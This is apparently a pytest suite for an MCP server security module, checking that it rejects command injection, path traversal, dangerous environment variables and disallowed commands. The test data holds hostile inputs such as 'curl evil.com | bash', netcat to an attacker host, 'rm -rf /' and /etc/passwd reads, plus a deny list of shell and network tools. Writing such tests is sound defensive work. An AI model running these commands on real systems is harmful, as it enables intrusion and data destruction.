"""
MCP Security Tests - Command Injection Prevention

Tests for src/mcp/security.py to ensure all command injection 
vulnerabilities are properly blocked.
"""

import pytest
from unittest.mock import patch

from automagik.mcp.security import (
    build_secure_command,
    validate_command,
    validate_command_argument,
    sanitize_command_arguments,
    filter_environment,
    validate_server_name,
    validate_file_path,
    validate_resource_uri,
    validate_mcp_config,
    resolve_command_path,
    SecurityError,
    ValidationError,
    DANGEROUS_ENV_VARS,
    MCPInputValidator
)


class TestCommandInjectionPrevention:
    """Test command injection attack prevention"""
    
    def test_command_injection_patterns_blocked(self):
        """Test that common command injection patterns are blocked"""
        malicious_inputs = [
            "test; rm -rf /",
            "test && wget evil.com/malware",
            "test || nc attacker.com 1234",
            "test | cat /etc/passwd",
            "test`whoami`",
            "test$(id)",
            "test & background_attack",
            "test > /etc/passwd",
            "test < /dev/random",
            "test\nrm -rf /",
            "test\rwget malware.sh"
        ]
        
        for malicious_input in malicious_inputs:
            with pytest.raises(ValidationError, match="dangerous pattern"):
                validate_command_argument(malicious_input)
    
    def test_shell_metacharacters_escaped(self):
        """Test that shell metacharacters are properly escaped"""
        test_cases = [
            ("file with spaces.txt", "'file with spaces.txt'"),
            ("file$var.txt", "'file$var.txt'"),
            ("file`cmd`.txt", "'file`cmd`.txt'"),
            ("file(test).txt", "'file(test).txt'"),
            ("file&test.txt", "'file&test.txt'"),
            ("file|test.txt", "'file|test.txt'")
        ]
        
        for input_arg, expected_output in test_cases:
            # Temporarily allow these for testing escaping
            with patch.object(MCPInputValidator, 'COMMAND_INJECTION_PATTERNS', []):
                sanitized = sanitize_command_arguments([input_arg])
                assert sanitized[0] == expected_output
    
    def test_path_traversal_blocked(self):
        """Test that path traversal attempts are blocked"""
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "file/../../../etc/passwd",
            "./../../etc/passwd"
        ]
        
        for malicious_path in malicious_paths:
            with pytest.raises(ValidationError, match="path traversal"):
                validate_command_argument(malicious_path)


class TestCommandAllowlisting:
    """Test command allowlisting functionality"""
    
    @patch('os.path.exists')
    @patch('os.path.samefile')
    def test_allowed_commands_pass(self, mock_samefile, mock_exists):
        """Test that allowed commands pass validation"""
        mock_exists.return_value = True
        mock_samefile.return_value = True
        
        # Test npx command
        assert validate_command("/usr/bin/npx", ["@modelcontextprotocol/server-test"])
        
        # Test python3 command  
        assert validate_command("/usr/bin/python3", ["-m", "mcp_server_test"])
    
    def test_disallowed_commands_blocked(self):
        """Test that disallowed commands are blocked"""
        disallowed_commands = [
            "bash", "sh", "zsh", "fish",
            "curl", "wget", "nc", "netcat",
            "rm", "mv", "cp", "dd",
            "chmod", "chown", "sudo"
        ]
        
        for command in disallowed_commands:
            with pytest.raises(SecurityError, match="Command not allowed|Command not found"):
                validate_command(command, [])
    
    @patch('os.path.exists')
    @patch('os.path.samefile')
    def test_argument_pattern_validation(self, mock_samefile, mock_exists):
        """Test that command arguments are validated against patterns"""
        mock_exists.return_value = True
        mock_samefile.return_value = True
        
        # Test allowed npx arguments
        validate_command("/usr/bin/npx", ["@modelcontextprotocol/server-filesystem"])
        
        # Test disallowed npx arguments
        with pytest.raises(SecurityError, match="Argument not allowed"):
            validate_command("/usr/bin/npx", ["malicious-package"])
    
    @patch('os.path.exists')
    @patch('os.path.samefile')
    def test_mcp_specific_patterns(self, mock_samefile, mock_exists):
        """Test MCP-specific command patterns"""
        mock_exists.return_value = True
        mock_samefile.return_value = True
        
        # Valid MCP server patterns
        valid_patterns = [
            ("/usr/bin/npx", ["@modelcontextprotocol/server-filesystem", "/tmp"]),
            ("/usr/bin/npx", ["@modelcontextprotocol/server-sqlite"]),
            ("/usr/bin/python3", ["-m", "mcp_server_custom"]),
            ("/usr/bin/node", ["server.js"])
        ]
        
        for command, args in valid_patterns:
            validate_command(command, args)
        
        # Invalid patterns should be blocked
        invalid_patterns = [
            ("/usr/bin/npx", ["evil-package"]),
            ("/usr/bin/npx", ["@evil/server-malware"]),
            ("/usr/bin/python3", ["-c", "malicious_code"]),
            ("/usr/bin/node", ["../../../malicious.js"])
        ]
        
        for command, args in invalid_patterns:
            with pytest.raises(SecurityError, match="Argument not allowed"):
                validate_command(command, args)
    
    def test_command_path_resolution(self):
        """Test command path resolution and validation"""
        with patch('os.path.exists') as mock_exists:
            with patch('os.access') as mock_access:
                # Test successful resolution
                mock_exists.side_effect = lambda path: path == "/usr/bin/npx"
                mock_access.return_value = True
                
                result = resolve_command_path("npx")
                assert result == "/usr/bin/npx"
                
                # Test command not found
                mock_exists.return_value = False
                with pytest.raises(SecurityError, match="not found in allowed directories"):
                    resolve_command_path("nonexistent")
    
    @patch('os.path.samefile')
    def test_symlink_attack_prevention(self, mock_samefile):
        """Test prevention of symlink-based attacks"""
        mock_samefile.return_value = False  # Simulate path mismatch
        
        with pytest.raises(SecurityError, match="path mismatch"):
            validate_command("/tmp/npx", ["@modelcontextprotocol/server-test"])


class TestEnvironmentFiltering:
    """Test environment variable filtering"""
    
    def test_dangerous_env_vars_blocked(self):
        """Test that dangerous environment variables are blocked"""
        dangerous_env = {
            "PATH": "/usr/bin:/malicious/path",
            "LD_PRELOAD": "/malicious/lib.so",
            "SHELL": "/bin/bash",
            "PROMPT_COMMAND": "curl evil.com"
        }
        
        filtered = filter_environment(dangerous_env)
        
        # Should block all dangerous variables
        for key in DANGEROUS_ENV_VARS:
            assert key not in filtered
    
    def test_safe_env_vars_allowed(self):
        """Test that safe environment variables are allowed"""
        safe_env = {
            "LANG": "en_US.UTF-8", 
            "TZ": "UTC",
            "NODE_ENV": "production",
            "MCP_SERVER_ROOT": "/opt/mcp"
        }
        
        filtered = filter_environment(safe_env)
        
        # Should allow all safe variables
        assert len(filtered) == len(safe_env)
        for key, value in safe_env.items():
            assert filtered[key] == value
    
    def test_env_value_validation(self):
        """Test environment variable value validation"""
        malicious_values = {
            "LANG": "C.UTF-8; curl evil.com",
            "NODE_ENV": "prod`whoami`",
            "TZ": "UTC$(id)"
        }
        
        for key, value in malicious_values.items():
            filtered = filter_environment({key: value})
            assert key not in filtered


class TestInputValidation:
    """Test general input validation functions"""
    
    def test_server_name_validation(self):
        """Test MCP server name validation"""
        # Valid names
        valid_names = ["test-server", "server_1", "MyServer", "test123"]
        for name in valid_names:
            assert validate_server_name(name)
        
        # Invalid names
        invalid_names = [
            ("", "Server name must be"),  # Empty
            ("a" * 65, "Server name must be"),  # Too long
            ("test server", "contains invalid characters"),  # Spaces
            ("test@server", "contains invalid characters"),  # Special chars
            ("123test", "contains invalid characters"),  # Start with number
            ("system", "reserved"),  # Reserved name
            ("admin", "reserved")   # Reserved name
        ]
        
        for name, expected_error in invalid_names:
            with pytest.raises(ValidationError, match=expected_error):
                validate_server_name(name)
    
    def test_file_path_validation(self):
        """Test file path validation"""
        # Valid paths (within allowed directories)
        valid_paths = ["/tmp/test.txt", "/var/tmp/data.json"]
        for path in valid_paths:
            assert validate_file_path(path)
        
        # Invalid paths
        invalid_paths = [
            "/etc/passwd",        # Outside allowed dirs
            "/tmp/../etc/passwd", # Traversal
            "/proc/version",      # System files
            "/sys/kernel/debug",  # System files
        ]
        
        for path in invalid_paths:
            with pytest.raises(ValidationError):
                validate_file_path(path)
    
    def test_resource_uri_validation(self):
        """Test MCP resource URI validation"""
        # Valid URIs
        valid_uris = [
            "file:///tmp/test.txt",
            "mcp://server/resource"
        ]
        for uri in valid_uris:
            assert validate_resource_uri(uri)
        
        # Invalid URIs
        invalid_uris = [
            "http://evil.com/malware",  # Disallowed scheme
            "ftp://server/file",        # Disallowed scheme
            "file:///etc/passwd",       # Dangerous file path
        ]
        
        for uri in invalid_uris:
            with pytest.raises(ValidationError):
                validate_resource_uri(uri)


class TestSecureCommandBuild:
    """Test secure command building"""
    
    @patch('automagik.mcp.security.resolve_command_path')
    @patch('automagik.mcp.security.validate_command')
    def test_secure_command_build(self, mock_validate, mock_resolve):
        """Test building secure commands"""
        mock_resolve.return_value = "/usr/bin/npx"
        mock_validate.return_value = True
        
        # Test successful command build
        secure_cmd, filtered_env = build_secure_command(
            base_command="npx",
            args=["@modelcontextprotocol/server-test"],
            env={"NODE_ENV": "production"}
        )
        
        assert secure_cmd[0] == "/usr/bin/npx"
        assert len(secure_cmd) == 2  # command + 1 arg
        assert "NODE_ENV" in filtered_env
        assert filtered_env["PATH"] == "/usr/bin:/bin"  # Minimal PATH
    
    def test_command_validation_failure(self):
        """Test command validation failure scenarios"""
        with pytest.raises((SecurityError, ValidationError)):
            build_secure_command(
                base_command="rm",  # Disallowed command
                args=["-rf", "/"],
                env={}
            )


class TestIntegrationSecurity:
    """Integration tests for MCP security"""
    
    def test_mcp_config_validation(self):
        """Test complete MCP configuration validation"""
        # Valid config
        valid_config = {
            "command": "npx",
            "args": ["@modelcontextprotocol/server-filesystem"],
            "env": {"NODE_ENV": "production"}
        }
        
        assert validate_mcp_config(valid_config)
        
        # Invalid config - malicious command
        malicious_config = {
            "command": "bash",
            "args": ["-c", "curl evil.com | bash"],
            "env": {"PATH": "/malicious/path"}
        }
        
        with pytest.raises(ValidationError):
            validate_mcp_config(malicious_config)
    
    def test_argument_length_limits(self):
        """Test argument length limits"""
        # Too long argument
        long_arg = "A" * 3000
        with pytest.raises(ValidationError, match="too long"):
            validate_command_argument(long_arg)
    
    def test_null_byte_injection(self):
        """Test null byte injection prevention"""
        malicious_args = [
            "test\x00evil",
            "normal_arg\x00rm -rf /",
        ]
        
        for arg in malicious_args:
            # Null bytes should be blocked at environment level
            filtered_env = filter_environment({"TEST": arg})
            assert "TEST" not in filtered_env


class TestAPISecurityIntegration:
    """Test security integration with API endpoints"""
    
    @pytest.fixture
    def mock_security_functions(self):
        """Mock security functions for testing"""
        with patch('automagik.mcp.security.validate_server_name') as mock_validate_name, \
             patch('automagik.mcp.security.validate_mcp_config') as mock_validate_config, \
             patch('automagik.mcp.security.build_secure_command') as mock_build_cmd:
            
            mock_validate_name.return_value = True
            mock_validate_config.return_value = True
            mock_build_cmd.return_value = (["/usr/bin/npx", "test"], {"PATH": "/usr/bin"})
            
            yield {
                'validate_name': mock_validate_name,
                'validate_config': mock_validate_config, 
                'build_command': mock_build_cmd
            }
    
    def test_security_validation_called(self, mock_security_functions):
        """Test that security validation is called in API endpoints"""
        # This would test the actual API endpoints, but since we're testing 
        # the security module in isolation, we verify the functions exist
        # and have the right signatures
        
        # Verify security functions are properly imported and callable
        assert callable(validate_server_name)
        assert callable(validate_mcp_config)
        assert callable(build_secure_command)
        assert callable(filter_environment)
    
    def test_security_error_handling(self):
        """Test security error handling"""
        # Test SecurityError
        try:
            raise SecurityError("Test security error")
        except SecurityError as e:
            assert str(e) == "Test security error"
        
        # Test ValidationError  
        try:
            raise ValidationError("Test validation error")
        except ValidationError as e:
            assert str(e) == "Test validation error"


# Performance tests for security functions
class TestSecurityPerformance:
    """Test performance of security functions"""
    
    def test_validation_performance(self):
        """Test that security validation performs reasonably"""
        import time
        
        # Test large number of validations complete quickly
        start_time = time.time()
        
        for i in range(1000):
            try:
                validate_command_argument(f"test_arg_{i}")
            except ValidationError:
                pass  # Expected for some test cases
        
        elapsed = time.time() - start_time
        assert elapsed < 1.0  # Should complete in under 1 second
    
    def test_environment_filtering_performance(self):
        """Test environment filtering performance"""
        import time
        
        # Large environment dictionary
        large_env = {f"VAR_{i}": f"value_{i}" for i in range(100)}
        
        start_time = time.time()
        filter_environment(large_env)
        elapsed = time.time() - start_time
        
        assert elapsed < 0.1  # Should be very fast


if __name__ == "__main__":
    pytest.main([__file__, "-v"]) 